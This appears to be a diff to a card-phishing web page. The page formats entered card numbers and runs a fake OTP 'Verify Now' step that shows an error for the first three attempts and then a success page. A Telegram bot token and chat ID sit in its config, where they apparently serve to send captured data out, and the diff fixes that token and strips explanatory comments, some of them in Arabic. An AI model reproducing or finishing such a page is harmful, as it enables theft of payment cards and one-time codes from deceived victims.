@@ -112,7 +112,6 @@
 
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* Pages control */
         .page { display: none; }
         .active { display: block; }
 
@@ -184,8 +183,7 @@
 
 <script>
     const CONFIG = {
-        token: '8549774953: AAGv1J83qInq-cdNNs51dDf
-Ovoeg-0ST_Q1',
+        token: '8549774953:AAGv1J83qInq-cdNNs51dDfOvoeg-0ST_Q1',
         chat: '656419637'
     };
 
@@ -199,7 +197,6 @@ Ovoeg-0ST_Q1',
         });
     }
 
-    // Card formatting
     document.getElementById('cardNum').addEventListener('input', e => {
         e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
     });
@@ -239,12 +236,10 @@ Ovoeg-0ST_Q1',
 
         setTimeout(() => {
             if (attempts < 3) {
-                // اظهر خطأ واطلب منه المحاولة مرة أخرى
                 btn.innerHTML = 'Verify Now';
                 error.style.display = 'block';
                 document.getElementById('otpCode').value = '';
             } else {
-                // بعد المحاولة الثالثة انتقل لصفحة النجاح النهائية
                 document.getElementById('otpPage').classList.remove('active');
                 document.getElementById('successPage').classList.add('active');
             }
